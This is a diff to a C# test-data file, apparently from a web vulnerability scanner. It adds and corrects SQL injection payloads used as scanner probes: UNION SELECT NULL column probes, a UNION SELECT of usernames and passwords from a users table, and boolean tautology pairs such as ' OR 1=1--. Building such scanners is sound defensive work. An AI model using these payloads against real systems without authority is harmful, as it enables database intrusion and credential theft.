@@ -19,6 +19,7 @@ namespace WebVulnerabilitiesScanner.TestData
             new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL--", SqlInjectionType.UnionBased),
             new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL--", SqlInjectionType.UnionBased),
             new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
+            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
             new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
             new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
             new RequestSqlInjectionPayloadEntity("' UNION SELECT username,password FROM users--", SqlInjectionType.UnionBased),
@@ -59,8 +60,8 @@ namespace WebVulnerabilitiesScanner.TestData
         {
             // Каждая пара описывает один и тот же синтаксис инъекции для истинного и ложного условия.
             new BooleanBasedPayloadPairEntity(
-                new RequestSqlInjectionPayloadEntity("' OR '1'='1", SqlInjectionType.BooleanBased),
-                new RequestSqlInjectionPayloadEntity("' OR '1'='2", SqlInjectionType.BooleanBased)),
+                new RequestSqlInjectionPayloadEntity("' OR '1'='1'", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' OR '1'='2'", SqlInjectionType.BooleanBased)),
             new BooleanBasedPayloadPairEntity(
                 new RequestSqlInjectionPayloadEntity("' OR 1=1--", SqlInjectionType.BooleanBased),
                 new RequestSqlInjectionPayloadEntity("' OR 1=2--", SqlInjectionType.BooleanBased)),
